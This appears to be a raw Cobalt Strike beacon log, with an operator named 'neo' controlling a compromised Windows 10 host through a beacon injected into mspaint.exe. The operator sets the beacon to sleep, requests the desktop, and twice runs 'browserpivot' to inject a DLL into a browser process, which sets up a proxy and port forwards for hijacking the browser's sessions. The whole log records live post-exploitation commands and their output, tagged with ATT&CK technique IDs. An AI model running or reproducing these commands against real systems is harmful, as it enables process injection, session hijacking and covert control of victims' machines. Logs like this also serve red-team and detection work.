01/06 04:50:01 UTC [metadata] 192.168.88.108 <- 192.168.88.108; computer: DESKTOP-29M090E; user: NITRO 5; process: mspaint.exe; pid: 11184; os: Windows; version: 10.0; build: 22621; beacon arch: x64 (x64)
01/06 04:50:20 UTC [input] <neo> sleep 5
01/06 04:50:20 UTC [task] <T1029> Tasked beacon to sleep for 5s
01/06 04:50:53 UTC [checkin] host called home, sent: 16 bytes
01/06 04:56:19 UTC [input] <neo> desktop
01/06 04:56:19 UTC [checkin] host called home, sent: 16 bytes
01/06 04:56:56 UTC [input] <neo> desktop
01/06 04:56:56 UTC [checkin] host called home, sent: 16 bytes
01/06 04:58:20 UTC [checkin] host called home, sent: 12 bytes
01/06 04:58:25 UTC [input] <neo> browserpivot 5052 x64
01/06 04:58:25 UTC [task] <T1111, T1055, T1185> Injecting browser pivot DLL into 5052 (x64)
01/06 04:58:25 UTC [output]
Browser Pivot HTTP proxy is at: 193.168.88.146:1294

01/06 04:58:25 UTC [output]
started port forward on 53682 to 127.0.0.1:53682

01/06 04:58:25 UTC [checkin] host called home, sent: 88096 bytes
01/06 05:00:23 UTC [checkin] host called home, sent: 12 bytes
01/06 05:00:31 UTC [input] <neo> browserpivot 5052 x64
01/06 05:00:31 UTC [checkin] host called home, sent: 88080 bytes
01/06 05:00:31 UTC [task] <T1111, T1055, T1185> Injecting browser pivot DLL into 5052 (x64)
01/06 05:00:31 UTC [error] This beacon already has a browser pivot session. Use 'browserpivot stop' to stop it.
01/06 05:00:31 UTC [output]
started port forward on 45043 to 127.0.0.1:45043

01/06 05:00:32 UTC [checkin] host called home, sent: 16 bytes
